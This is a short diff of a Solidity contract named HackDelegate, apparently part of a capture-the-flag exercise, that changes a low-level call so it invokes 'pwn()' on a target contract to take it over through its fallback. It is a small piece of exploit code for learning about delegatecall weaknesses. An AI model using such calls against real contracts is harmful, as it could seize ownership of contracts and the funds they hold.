@@ -15,7 +15,7 @@ contract HackDelegate {
 
   function callFallback(address _addr) public {
     (bool success, bytes memory data) = _addr.call(
-      abi.encodeWithSignature("notAFunction()")
+      abi.encodeWithSignature("pwn()")
     );
 
     emit Successful(success, data);
